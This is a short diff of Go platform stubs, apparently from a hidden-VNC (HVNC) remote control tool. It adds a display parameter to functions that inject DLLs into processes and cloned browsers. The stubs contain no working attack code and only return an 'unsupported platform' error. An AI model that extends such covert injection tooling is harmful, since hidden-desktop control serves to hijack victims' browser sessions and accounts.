@@ -4,7 +4,7 @@ package capture
 
 import "errors"
 
-func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string) (uint32, error) {
+func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	return 0, errors.New("HVNC injection not supported on this platform")
 }
 
@@ -16,7 +16,7 @@ type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status s
 type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
 type LaunchStatusFunc func(step string, success bool, detail string)
 
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	return errors.New("HVNC injection not supported on this platform")
 }
 
